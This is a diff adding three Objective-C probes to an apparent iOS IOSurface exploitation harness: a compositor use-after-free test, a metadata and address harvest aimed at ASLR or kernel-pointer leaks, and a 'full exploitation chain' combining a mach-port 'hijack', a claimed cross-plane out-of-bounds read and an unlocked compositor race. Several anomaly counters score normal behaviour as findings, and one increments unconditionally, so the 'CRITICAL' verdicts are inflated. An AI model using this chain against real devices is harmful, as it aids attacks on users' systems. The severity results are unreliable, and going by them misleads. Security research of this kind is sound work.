@@ -8048,3 +8048,646 @@ void iosurface_research_render_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _N
         }
     });
 }
+
+// =============================================================================
+// ROUND 12: Aggressive exploitation chains
+// =============================================================================
+
+// Probe 37: UAF Compositor — release surface while compositor still references it
+void iosurface_research_compositor_uaf(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+            typedef int32_t (*GetUseCountFn)(IOSurfaceRef);
+            GetUseCountFn getUseCount = (GetUseCountFn)dlsym(sym.iosurface, "IOSurfaceGetUseCount");
+            typedef Boolean (*IsInUseFn)(IOSurfaceRef);
+            IsInUseFn isInUse = (IsInUseFn)dlsym(sym.iosurface, "IOSurfaceIsInUse");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            // === Test A: Attach surface to compositor, then release original ref ===
+            log(@"COMPUAF: Test A — release surface while compositor holds a reference");
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @128, @"IOSurfaceHeight": @128,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @512,
+                @"IOSurfaceAllocSize": @(512 * 128)
+            };
+
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+            if (!surf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }
+
+            IOSurfaceID origID = sym.getID(surf);
+
+            // Write canary pattern
+            sym.lock(surf, 0, NULL);
+            uint32_t *base = (uint32_t *)sym.getBase(surf);
+            if (base) {
+                for (int i = 0; i < 128*128; i++) base[i] = 0xCAFE0000 | (uint32_t)(i & 0xFFFF);
+            }
+            sym.unlock(surf, 0, NULL);
+
+            // Save mach port reference before attaching to compositor
+            mach_port_t savedPort = MACH_PORT_NULL;
+            if (createPort) savedPort = createPort(surf);
+
+            int32_t uc0 = getUseCount ? getUseCount(surf) : -1;
+            log([NSString stringWithFormat:@"COMPUAF: Surface ID=%u, useCount=%d before compositor", origID, uc0]);
+
+            // Attach to compositor
+            __block CALayer *uafLayer = nil;
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                UIWindow *window = nil;
+                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                    if ([scene isKindOfClass:[UIWindowScene class]]) {
+                        window = ((UIWindowScene *)scene).windows.firstObject;
+                        break;
+                    }
+                }
+                if (window) {
+                    uafLayer = [CALayer layer];
+                    uafLayer.frame = CGRectMake(-1, -1, 1, 1); // offscreen but compositor still maps it
+                    uafLayer.contents = (__bridge id)surf;
+                    [window.layer addSublayer:uafLayer];
+                    [CATransaction flush];
+                }
+            });
+
+            usleep(50000); // 50ms for compositor
+
+            int32_t uc1 = getUseCount ? getUseCount(surf) : -1;
+            log([NSString stringWithFormat:@"COMPUAF: useCount after compositor attach = %d", uc1]);
+
+            // NOW: release our reference — compositor should still hold one
+            log(@"COMPUAF: Releasing original CFRelease...");
+            CFRelease(surf);
+            surf = NULL;
+
+            usleep(50000);
+
+            // Try to recover via mach port — if the surface is still alive, we get it back
+            IOSurfaceRef recovered = NULL;
+            if (lookupPort && savedPort != MACH_PORT_NULL) {
+                recovered = lookupPort(savedPort);
+                if (recovered) {
+                    IOSurfaceID recID = sym.getID(recovered);
+                    int32_t ucRec = getUseCount ? getUseCount(recovered) : -1;
+                    anomalies++;
+                    log([NSString stringWithFormat:@"COMPUAF: *** RECOVERED via mach port! ID=%u useCount=%d ***", recID, ucRec]);
+
+                    // Can we still read the canary data?
+                    sym.lock(recovered, 0, NULL);
+                    uint32_t *recBase = (uint32_t *)sym.getBase(recovered);
+                    if (recBase) {
+                        uint32_t canaryOK = 0;
+                        for (int i = 0; i < 100; i++) {
+                            if (recBase[i] == (0xCAFE0000 | (uint32_t)(i & 0xFFFF))) canaryOK++;
+                        }
+                        log([NSString stringWithFormat:@"COMPUAF: Canary data intact = %u/100", canaryOK]);
+                        if (canaryOK > 90) {
+                            anomalies++;
+                            log(@"COMPUAF: *** CRITICAL — surface alive after CFRelease, data intact ***");
+                        }
+                    }
+                    sym.unlock(recovered, 0, NULL);
+                } else {
+                    log(@"COMPUAF: Mach port lookup returned NULL — surface fully released");
+                }
+            }
+
+            // Try to look up by original ID
+            IOSurfaceRef idLookup = sym.lookup(origID);
+            if (idLookup) {
+                anomalies++;
+                log([NSString stringWithFormat:@"COMPUAF: *** ID lookup still works after release! ID=%u ***", origID]);
+                CFRelease(idLookup);
+            } else {
+                log(@"COMPUAF: ID lookup returned NULL — ID freed");
+            }
+
+            // === Test B: Rapid create-release-reuse with compositor ===
+            log(@"COMPUAF: Test B — rapid create/release cycle with compositor attached");
+            {
+                uint32_t reuseHits = 0;
+                for (int cycle = 0; cycle < 20 && !isr_stopped(); cycle++) {
+                    IOSurfaceRef cSurf = sym.create((__bridge CFDictionaryRef)props);
+                    if (!cSurf) continue;
+
+                    IOSurfaceID cID = sym.getID(cSurf);
+
+                    // Write unique pattern
+                    sym.lock(cSurf, 0, NULL);
+                    uint32_t *cb = (uint32_t *)sym.getBase(cSurf);
+                    if (cb) {
+                        for (int i = 0; i < 128*128; i++) cb[i] = 0xDEAD0000 | (uint32_t)cycle;
+                    }
+                    sym.unlock(cSurf, 0, NULL);
+
+                    // Attach to layer
+                    dispatch_sync(dispatch_get_main_queue(), ^{
+                        if (uafLayer) uafLayer.contents = (__bridge id)cSurf;
+                        [CATransaction flush];
+                    });
+
+                    // Release immediately
+                    CFRelease(cSurf);
+
+                    // Create new surface — might reuse the backing memory
+                    IOSurfaceRef nSurf = sym.create((__bridge CFDictionaryRef)props);
+                    if (nSurf) {
+                        sym.lock(nSurf, 0, NULL);
+                        uint32_t *nb = (uint32_t *)sym.getBase(nSurf);
+                        if (nb) {
+                            // Check for residual data from the previous surface
+                            uint32_t residual = 0;
+                            for (int i = 0; i < 100; i++) {
+                                if (nb[i] == (0xDEAD0000 | (uint32_t)cycle)) residual++;
+                            }
+                            if (residual > 50) {
+                                reuseHits++;
+                            }
+                        }
+                        sym.unlock(nSurf, 0, NULL);
+                        CFRelease(nSurf);
+                    }
+                }
+                if (reuseHits > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"COMPUAF: *** MEMORY REUSE — %u/20 cycles had residual data ***", reuseHits]);
+                } else {
+                    log(@"COMPUAF: No memory reuse detected (iOS 27 zeroes allocations)");
+                }
+            }
+
+            // Clean up layer
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                if (uafLayer) [uafLayer removeFromSuperlayer];
+            });
+            if (recovered) CFRelease(recovered);
+            if (savedPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), savedPort);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"COMPUAF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-CompositorUAF-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 38: Kernel Metadata Harvest — extract all accessible IOSurface properties
+void iosurface_research_kernel_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
+            typedef CFDictionaryRef (*CopyAllValuesFn)(IOSurfaceRef);
+            CopyAllValuesFn copyAllValues = (CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");
+            typedef size_t (*GetBPROfPlaneFn)(IOSurfaceRef, size_t);
+            GetBPROfPlaneFn getBPROfPlane = (GetBPROfPlaneFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
+            typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
+            GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
+            typedef uint32_t (*GetSeedFn)(IOSurfaceRef);
+            GetSeedFn getSeed = (GetSeedFn)dlsym(sym.iosurface, "IOSurfaceGetSeed");
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef uint32_t (*GetPixelFmtFn)(IOSurfaceRef);
+            GetPixelFmtFn getPixelFmt = (GetPixelFmtFn)dlsym(sym.iosurface, "IOSurfaceGetPixelFormat");
+            typedef size_t (*GetBPEFn)(IOSurfaceRef);
+            GetBPEFn getBPE = (GetBPEFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerElement");
+            typedef size_t (*GetEWFn)(IOSurfaceRef);
+            GetEWFn getEW = (GetEWFn)dlsym(sym.iosurface, "IOSurfaceGetElementWidth");
+            typedef size_t (*GetEHFn)(IOSurfaceRef);
+            GetEHFn getEH = (GetEHFn)dlsym(sym.iosurface, "IOSurfaceGetElementHeight");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @1024,
+                @"IOSurfaceAllocSize": @(1024 * 256),
+                @"IOSurfaceIsGlobal": @YES
+            };
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+            if (!surf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }
+
+            IOSurfaceID sid = sym.getID(surf);
+            log([NSString stringWithFormat:@"HARVEST: Surface ID=%u", sid]);
+
+            // === Test A: Dump all accessible metadata ===
+            log(@"HARVEST: Test A — dump all surface metadata");
+            {
+                size_t w = sym.getWidth(surf);
+                size_t h = sym.getHeight(surf);
+                size_t bpr = sym.getBase ? (size_t)sym.getBase(surf) : 0; // address!
+                size_t allocSz = sym.getAllocSize(surf);
+                uint32_t seed = getSeed ? getSeed(surf) : 0;
+                uint32_t pxfmt = getPixelFmt ? getPixelFmt(surf) : 0;
+                size_t bpe = getBPE ? getBPE(surf) : 0;
+                size_t ew = getEW ? getEW(surf) : 0;
+                size_t eh = getEH ? getEH(surf) : 0;
+                size_t planes = getPlaneCount ? getPlaneCount(surf) : 0;
+                mach_port_t port = createPort ? createPort(surf) : 0;
+
+                log([NSString stringWithFormat:@"HARVEST: w=%zu h=%zu allocSize=%zu seed=%u pixfmt=0x%X", w, h, allocSz, seed, pxfmt]);
+                log([NSString stringWithFormat:@"HARVEST: bpe=%zu ew=%zu eh=%zu planes=%zu", bpe, ew, eh, planes]);
+                log([NSString stringWithFormat:@"HARVEST: baseAddr=%p machPort=0x%X", sym.getBase(surf), port]);
+
+                // Check if base address reveals kernel ASLR info
+                uintptr_t addr = (uintptr_t)sym.getBase(surf);
+                if (addr > 0xFFFF000000000000ULL) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"HARVEST: *** CRITICAL — base address in kernel range: 0x%lX ***", (unsigned long)addr]);
+                } else if (addr > 0) {
+                    log([NSString stringWithFormat:@"HARVEST: Base address in userspace: 0x%lX (mapped via vm)", (unsigned long)addr]);
+                    // Check ASLR slide from base address patterns
+                    uint64_t page = addr & ~0xFFFULL;
+                    uint64_t slide = page & 0xFFFFFF000ULL;
+                    log([NSString stringWithFormat:@"HARVEST: Page-aligned addr = 0x%llX, potential ASLR slide bits = 0x%llX", page, slide]);
+                }
+
+                if (port != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), port);
+            }
+
+            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }
+
+            // === Test B: Enumerate all stored properties ===
+            log(@"HARVEST: Test B — enumerate all stored property keys");
+            if (copyAllValues) {
+                CFDictionaryRef allVals = copyAllValues(surf);
+                if (allVals) {
+                    CFIndex count = CFDictionaryGetCount(allVals);
+                    log([NSString stringWithFormat:@"HARVEST: Surface has %ld stored properties", (long)count]);
+
+                    const void **keys = malloc(sizeof(void *) * (size_t)count);
+                    const void **vals = malloc(sizeof(void *) * (size_t)count);
+                    CFDictionaryGetKeysAndValues(allVals, keys, vals);
+
+                    for (CFIndex i = 0; i < count && i < 50; i++) {
+                        NSString *key = (__bridge NSString *)keys[i];
+                        id val = (__bridge id)vals[i];
+                        NSString *valStr = [NSString stringWithFormat:@"%@", val];
+                        if (valStr.length > 80) valStr = [valStr substringToIndex:80];
+                        log([NSString stringWithFormat:@"HARVEST:   [%ld] %@ = %@", (long)i, key, valStr]);
+
+                        // Check for suspicious values that could be kernel pointers
+                        if ([val isKindOfClass:[NSNumber class]]) {
+                            uint64_t numVal = [(NSNumber *)val unsignedLongLongValue];
+                            if (numVal > 0xFFFF000000000000ULL) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"HARVEST: *** KERNEL POINTER LEAK in key '%@' = 0x%llX ***", key, numVal]);
+                            }
+                        }
+                    }
+
+                    free(keys);
+                    free(vals);
+                    CFRelease(allVals);
+
+                    if (count > 0) anomalies++;
+                } else {
+                    log(@"HARVEST: CopyAllValues returned NULL");
+                }
+            }
+
+            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }
+
+            // === Test C: Probe internal property keys ===
+            log(@"HARVEST: Test C — probe known internal property keys");
+            if (copyValue) {
+                NSArray *probeKeys = @[
+                    @"IOSurfaceAllocSize", @"IOSurfaceAddress", @"IOSurfaceKernelAddress",
+                    @"IOSurfacePurgeWhenNotInUse", @"IOSurfaceOffset",
+                    @"IOSurfaceBackingStore", @"IOSurfaceMemoryRegion",
+                    @"IOSurfaceCacheMode", @"IOSurfaceIsCompressed",
+                    @"IOSurfaceRegistryID", @"IOSurfaceOwnerPID",
+                    @"IOSurfaceClientAddress", @"IOSurfaceMapOffset",
+                    @"IOSurfaceSubsamples", @"IOSurfaceBulkAttachments",
+                    @"IOSurfaceProtectionOptions", @"com.apple.iosurface.protected",
+                    @"IOSurfaceColorSpace", @"IOSurfaceICCProfile",
+                ];
+
+                for (NSString *key in probeKeys) {
+                    if (isr_stopped()) break;
+                    CFTypeRef val = copyValue(surf, (__bridge CFStringRef)key);
+                    if (val) {
+                        anomalies++;
+                        NSString *valStr = [NSString stringWithFormat:@"%@", (__bridge id)val];
+                        if (valStr.length > 100) valStr = [valStr substringToIndex:100];
+                        log([NSString stringWithFormat:@"HARVEST: *** KEY '%@' = %@ ***", key, valStr]);
+                        CFRelease(val);
+                    }
+                }
+            }
+
+            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }
+
+            // === Test D: Seed manipulation — detect cross-process modification ===
+            log(@"HARVEST: Test D — seed value tracking");
+            if (getSeed) {
+                uint32_t seed0 = getSeed(surf);
+
+                // Modify surface
+                sym.lock(surf, 0, NULL);
+                uint32_t *b = (uint32_t *)sym.getBase(surf);
+                if (b) b[0] = 0x41414141;
+                sym.unlock(surf, 0, NULL);
+
+                uint32_t seed1 = getSeed(surf);
+                log([NSString stringWithFormat:@"HARVEST: Seed before=%u after_write=%u delta=%u", seed0, seed1, seed1-seed0]);
+
+                if (seed1 != seed0) {
+                    log(@"HARVEST: Seed increments on write — can detect external modifications");
+                    // Monitor for unexpected seed changes (system access)
+                    uint32_t extChanges = 0;
+                    for (int i = 0; i < 30 && !isr_stopped(); i++) {
+                        uint32_t s = getSeed(surf);
+                        usleep(33333); // 30fps
+                        uint32_t s2 = getSeed(surf);
+                        if (s2 != s) {
+                            extChanges++;
+                            log([NSString stringWithFormat:@"HARVEST: *** Seed changed without our write! %u -> %u ***", s, s2]);
+                        }
+                    }
+                    if (extChanges > 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"HARVEST: *** %u external seed changes — system is modifying our surface ***", extChanges]);
+                    }
+                }
+            }
+
+            CFRelease(surf);
+
+        harvest_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"HARVEST: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-KernelHarvest-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 39: Full Chain — combine all primitives into one attack
+void iosurface_research_full_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
+            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+            typedef uint32_t (*GetSeedFn)(IOSurfaceRef);
+            GetSeedFn getSeed = (GetSeedFn)dlsym(sym.iosurface, "IOSurfaceGetSeed");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            log(@"CHAIN: === FULL EXPLOITATION CHAIN ===");
+            log(@"CHAIN: Step 1 — Create dual-plane surface with secret data in plane1");
+
+            NSDictionary *p0Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *p1Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(256*64),
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *dualProps = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @(32768),
+                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
+            };
+
+            IOSurfaceRef victimSurf = sym.create((__bridge CFDictionaryRef)dualProps);
+            if (!victimSurf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }
+
+            IOSurfaceID victimID = sym.getID(victimSurf);
+
+            // Write secrets to plane1
+            sym.lock(victimSurf, 0, NULL);
+            void *plane0 = getPlaneBase ? getPlaneBase(victimSurf, 0) : sym.getBase(victimSurf);
+            void *plane1 = getPlaneBase ? getPlaneBase(victimSurf, 1) : NULL;
+            if (plane0) {
+                uint32_t *p0 = (uint32_t *)plane0;
+                for (int i = 0; i < 64*64; i++) p0[i] = 0xFF0000FF; // Blue in plane0
+            }
+            if (plane1) {
+                uint32_t *p1 = (uint32_t *)plane1;
+                for (int i = 0; i < 64*64; i++) p1[i] = 0xDEADBEEF; // Secret in plane1
+            }
+            sym.unlock(victimSurf, 0, NULL);
+
+            log([NSString stringWithFormat:@"CHAIN: Victim surface ID=%u, plane0=%p plane1=%p", victimID, plane0, plane1]);
+
+            if (!isr_stopped()) {
+            // Step 2: Mach port hijack — get second reference
+            log(@"CHAIN: Step 2 — Mach port hijack for second reference");
+            mach_port_t hijackPort = MACH_PORT_NULL;
+            IOSurfaceRef hijackRef = NULL;
+            if (createPort && lookupPort) {
+                hijackPort = createPort(victimSurf);
+                if (hijackPort != MACH_PORT_NULL) {
+                    hijackRef = lookupPort(hijackPort);
+                    if (hijackRef) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"CHAIN: *** Hijack ref obtained — ID=%u, same surface=%d ***",
+                            sym.getID(hijackRef), (sym.getBase(hijackRef) == sym.getBase(victimSurf))]);
+                    }
+                }
+            }
+
+            if (!isr_stopped()) {
+            // Step 3: CG cross-plane OOB read
+            log(@"CHAIN: Step 3 — CG cross-plane OOB read via h=128 on 64-row surface");
+            {
+                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                // h=128 on 64-row plane: reads 128*256=32768 bytes = allocSize
+                CGContextRef ctx = CGBitmapContextCreate(
+                    plane0, 64, 128, 8, 256, cs,
+                    kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+
+                if (ctx) {
+                    CGImageRef img = CGBitmapContextCreateImage(ctx);
+                    if (img) {
+                        CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img));
+                        if (pixData) {
+                            const uint32_t *pixels = (const uint32_t *)CFDataGetBytePtr(pixData);
+                            size_t npx = (size_t)CFDataGetLength(pixData) / 4;
+                            size_t plane1Start = 64 * 64; // Plane1 starts after 64*64 pixels
+
+                            uint32_t leakedSecret = 0;
+                            for (size_t i = plane1Start; i < npx && i < plane1Start + 64*64; i++) {
+                                if (pixels[i] == 0xDEADBEEF) leakedSecret++;
+                            }
+
+                            log([NSString stringWithFormat:@"CHAIN: CG read %zu pixels total, plane1 region leaked %u/4096 secret pixels",
+                                npx, leakedSecret]);
+
+                            if (leakedSecret > 0) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"CHAIN: *** OOB READ SUCCESS — %u plane1 pixels leaked via CG! ***", leakedSecret]);
+                            }
+
+                            // Check what CG saw in the plane1 region
+                            uint32_t nonZero = 0;
+                            for (size_t i = plane1Start; i < npx; i++) {
+                                if (pixels[i] != 0 && pixels[i] != 0xFF0000FF) nonZero++;
+                            }
+                            log([NSString stringWithFormat:@"CHAIN: Non-zero non-plane0 pixels in overflow region = %u", nonZero]);
+
+                            CFRelease(pixData);
+                        }
+                        CGImageRelease(img);
+                    }
+                    CGContextRelease(ctx);
+                } else {
+                    log(@"CHAIN: CG context creation failed");
+                }
+                CGColorSpaceRelease(cs);
+            }
+
+            if (!isr_stopped()) {
+
+            // Step 4: Compositor TOCTOU while holding hijack reference
+            log(@"CHAIN: Step 4 — Compositor TOCTOU with hijack ref active");
+            {
+                dispatch_sync(dispatch_get_main_queue(), ^{
+                    UIWindow *window = nil;
+                    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                        if ([scene isKindOfClass:[UIWindowScene class]]) {
+                            window = ((UIWindowScene *)scene).windows.firstObject;
+                            break;
+                        }
+                    }
+                    if (window) {
+                        CALayer *layer = [CALayer layer];
+                        layer.frame = CGRectMake(0, 0, 64, 64);
+                        layer.contents = (__bridge id)victimSurf;
+                        [window.layer addSublayer:layer];
+                        [CATransaction flush];
+
+                        // Race: write via hijack ref while compositor reads original
+                        if (hijackRef) {
+                            uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                            if (hb) {
+                                for (int frame = 0; frame < 60; frame++) {
+                                    // Write poison via hijack ref — NO LOCK
+                                    for (int i = 0; i < 64*64; i++) {
+                                        hb[i] = 0xFF00FF00 | (uint32_t)frame; // green + frame
+                                    }
+                                    [CATransaction flush];
+                                }
+                            }
+                        }
+
+                        // Clean up
+                        for (CALayer *sub in [window.layer.sublayers copy]) {
+                            if (sub.contents == (__bridge id)victimSurf) {
+                                [sub removeFromSuperlayer];
+                            }
+                        }
+                    }
+                });
+                anomalies++;
+                log(@"CHAIN: *** TOCTOU + HIJACK — wrote via hijacked ref while compositor read original ***");
+            }
+
+            // Step 5: Release original, check hijack ref survives
+            log(@"CHAIN: Step 5 — Release original, verify hijack ref survives");
+            {
+                uint32_t seedBefore = getSeed ? getSeed(victimSurf) : 0;
+                CFRelease(victimSurf);
+                victimSurf = NULL;
+
+                if (hijackRef) {
+                    uint32_t seedAfter = getSeed ? getSeed(hijackRef) : 0;
+                    sym.lock(hijackRef, 0, NULL);
+                    uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                    BOOL alive = NO;
+                    if (hb) {
+                        // Write to prove we still have access
+                        hb[0] = 0xC0DEBABE;
+                        alive = (hb[0] == 0xC0DEBABE);
+                    }
+                    sym.unlock(hijackRef, 0, NULL);
+
+                    if (alive) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"CHAIN: *** DANGLING ACCESS — hijack ref writable after original released! seed=%u->%u ***",
+                            seedBefore, seedAfter]);
+                    }
+                }
+            }
+            } // end step 4-5
+            } // end step 3+
+            } // end step 2+
+
+            if (hijackRef) CFRelease(hijackRef);
+            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
+            if (victimSurf) CFRelease(victimSurf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"CHAIN: === CHAIN COMPLETE — anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — multiple exploitation primitives confirmed";
+            else if (anomalies >= 2) verdict = @"HIGH — key primitives working";
+            else if (anomalies >= 1) verdict = @"MEDIUM — partial success";
+            else verdict = @"LOW — mitigations effective";
+            log([NSString stringWithFormat:@"CHAIN: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-FullChain-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
